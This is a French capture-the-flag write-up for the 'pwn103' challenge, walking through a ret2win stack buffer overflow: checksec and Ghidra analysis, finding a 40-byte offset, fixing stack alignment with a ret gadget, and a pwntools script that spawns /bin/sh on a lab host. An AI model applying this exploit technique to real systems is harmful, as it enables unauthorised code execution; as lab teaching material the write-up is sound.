# pwn103 challenge

Objectif : exploiter une vulnérabilité dans un binaire ELF pour rediriger le flux d’exécution vers une fonction cachée admins_only et obtenir un shell.

## Analyse initial

On commence par regarder le binaire avec file et checksec:
    file pwn103-1644300337872.pwn103
    pwn103-1644300337872.pwn103: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3df2200610f5e40aa42eadb73597910054cf4c9f, for GNU/Linux 3.2.0, not stripped

checksec --f  pwn103-1644300337872.pwn103
[*] '/home/kali/Downloads/pwn103-1644300337872.pwn103'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No

Pas de canary → stack buffer overflow possible sans protection stack cookie.

Pas de PIE → les adresses dans le binaire sont fixes (très pratique pour du ret2func).

NX activé → on ne peut pas exécuter directement du shellcode sur la stack, donc on va faire du ret2win

## Reverse enginnering

Dans Ghidra, on trouve :

Une fonction general() qui demande une entrée utilisateur avec un scanf("%s", buffer), buffer de 32 octets → vulnérable au stack overflow.

Une fonction admins_only() qui lance /bin/sh.

Dans le main, on voit qu’en choisissant l’option 3, on arrive dans general().

## Exploitation

Trouve l'offset :
    $ cyclic 200
    aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaala...

On envoie ce pattern comme entrée après avoir choisi 3 :

$ gdb ./pwn103
(gdb) run
...
(gdb) i r rsp
rip            0x7fffffffde08 : kaaa

pwndbg> cyclic -l kaaa
40
l'addresse de admins_only :
Dans Ghidra :

    void admins_only(void)
    {
        system("/bin/sh");
    }
Adresse : 0x401554.

Problème du movaps:
En 64-bit, certaines instructions comme movaps exigent que RSP soit aligné à 16 octets au moment du call.
Pour éviter un crash, on ajoute un ROP gadget ret avant admins_only :

    ROPgadget --binary pwn103 | grep "ret"
    0x0000000000401016 : ret
Construction du payload :
    from pwn import *

    p = remote("10.10.xx.xx", 9003)  # connexion distante

    offset = 40
    ret_gadget = 0x401016
    admins_only = 0x401554

    payload = b"A" * offset
    payload += p64(ret_gadget)
    payload += p64(admins_only)

    # Choix menu
    p.sendline(b"3")
    p.sendline(payload)

    p.interactive()
    
## Conclusion

Vulnérabilité : buffer overflow via scanf() sans limite → écrasement RIP.

Protection contournée : NX via ret2win, pas de PIE.

Problème technique : movaps alignment résolu par un gadget ret.

Gain final : exécution de admins_only → /bin/sh → flag.
